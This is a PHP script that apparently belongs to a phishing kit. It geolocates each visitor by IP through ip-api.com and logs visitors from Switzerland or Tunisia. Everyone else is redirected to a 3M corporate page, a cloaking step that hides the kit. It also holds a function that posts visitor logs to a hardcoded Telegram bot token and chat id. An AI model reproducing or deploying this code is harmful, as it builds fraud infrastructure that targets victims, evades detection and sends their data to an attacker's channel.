<?php

error_reporting(0);
//////////////////////////////////////// GET Country & Country CODE ! ////////////////////////////////////////////////
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $ip = $forward;
}
else{
    $_SESSION['_ip_'] = $ip = $remote;
}
$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$_SESSION['_ip_']));
$LOOKUP_COUNTRY = $IP_LOOKUP->country;
$LOOKUP_CNTRCODE= $IP_LOOKUP->countryCode;
$LOOKUP_CITY    = $IP_LOOKUP->city;
$LOOKUP_REGION  = $IP_LOOKUP->region;
$LOOKUP_STATE   = $IP_LOOKUP->regionName;
$LOOKUP_ZIPCODE = $IP_LOOKUP->zip;
$LOOKUP_ISP     = $IP_LOOKUP->isp;
$_SESSION['_LOOKUP_ISP_'] = $LOOKUP_ISP;
$_SESSION['_LOOKUP_COUNTRY_'] = $LOOKUP_COUNTRY;
$_SESSION['_LOOKUP_CNTRCODE_']= $LOOKUP_CNTRCODE;
$_SESSION['_LOOKUP_CITY_']    = $LOOKUP_CITY;
$_SESSION['_LOOKUP_REGION_']  = $LOOKUP_REGION;
$_SESSION['_LOOKUP_STATE_']   = $LOOKUP_STATE;
$_SESSION['_LOOKUP_ZIPCODE_'] = $LOOKUP_ZIPCODE;
$_SESSION['_LOOKUP_REGIONS_'] = $_SESSION['_LOOKUP_STATE_']."(".$_SESSION['_LOOKUP_REGION_'].")";
$_SESSION['_forlogin_'] = $_SESSION['_LOOKUP_CNTRCODE_']." - ".$_SESSION['_ip_'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
if (preg_match('/\bCH|TN\b/', $_SESSION['_LOOKUP_CNTRCODE_'])) {
   $LOGS = "[".date('Y-m-d H:i:s')."] ".$_SESSION['_LOOKUP_CNTRCODE_']." - ".$_SESSION['_ip_']." - ".$_SESSION['_LOOKUP_ISP_']."";
file_put_contents('./V.txt', $LOGS . PHP_EOL, FILE_APPEND);
}else{
     $LOGS = "[".date('Y-m-d H:i:s')."] ".$_SESSION['_LOOKUP_CNTRCODE_']." - ".$_SESSION['_ip_']." - ".BLOCKED." - ".$_SESSION['_LOOKUP_ISP_']."";
file_put_contents('./VISITOR.txt', $LOGS . PHP_EOL, FILE_APPEND);
{exit(header('Location: https://www.3m.com/3M/en_US/company-us/about-3m/'));}
function Vist($cc) {
  
    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot1391582933:AAEbv1IX10SslMxNCIw-GfLWw3pEvV1ZTM0/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=-765082088&text=user\n".$cc."");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

curl_close ($ch);

}

Vist($LOGS);

}



?>